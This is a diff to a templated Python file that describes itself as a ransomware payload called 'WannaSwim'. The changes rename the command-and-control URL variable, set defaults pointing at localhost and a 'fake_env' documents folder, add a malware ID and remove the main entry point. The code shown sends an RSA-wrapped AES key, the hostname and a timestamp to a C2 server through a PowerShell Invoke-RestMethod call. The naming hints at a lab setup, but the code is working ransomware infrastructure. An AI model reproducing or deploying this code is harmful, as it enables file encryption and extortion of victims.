@@ -5,6 +5,8 @@ lang: python
 description: WannaSwim is a ransomware payload written in Python.
 ---#}
 
+{% set start = "encrypt_fake_env_files" %}
+
 # --- IMPORTS ---
 import os
 import requests
@@ -25,10 +27,10 @@ from Crypto.PublicKey import RSA
 import base64
 
 # --- CONFIGURATION ---
-C2_URL = "{{ c2_url }}"
-FOLDER_PATH = r"{{ folder_path }}"
+C2_URL_KRAKEN = "{{ c2_url_kraken | default('http://127.0.0.1:8000') }}"
+FOLDER_PATH = r"{{ folder_path | default('C:/Users/XXX/Documents/fake_env_Documents') }}"
 RSA_KEY = "{{ rsa_key_b64 }}"
-EXTENSION = "{{ file_extension }}"
+EXTENSION = "{{ file_extension | default('kraken') }}"
 
 
 # --- LOGIQUE ---
@@ -86,17 +88,18 @@ def encrypt_fake_env_files():
 def send_aes_key_to_c2(key):
   public_key = load_rsa_public_key()
   encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
-  c2_url = "{{ c2_url }}"
+  c2_url_kraken = "{{ c2_url_kraken }}"
   hostname = socket.gethostname()
   timestamp = datetime.datetime.now().isoformat()
   payload = {
+      "malware_id": "4635749326579220869218518754801909255745",
       "aes_key": encrypted_aes_key.hex(),
       "hostname": hostname,
       "timestamp": timestamp
   }
   json_payload = json.dumps(payload)
   powershell_command = f'''
-Invoke-RestMethod -Uri "{c2_url}" -Method Post -Body '{json_payload}' -ContentType "application/json"
+Invoke-RestMethod -Uri "{c2_url_kraken}" -Method Post -Body '{json_payload}' -ContentType "application/json"
 '''
   try:
       subprocess.run(
@@ -121,8 +124,4 @@ def encrypt_aes_key_with_rsa(aes_key, public_key):
     cipher_rsa = PKCS1_OAEP.new(public_key)
     return cipher_rsa.encrypt(aes_key)
 
-
-# --- bloc_main ---
-if __name__ == "__main__":
-    encrypt_fake_env_files()
 
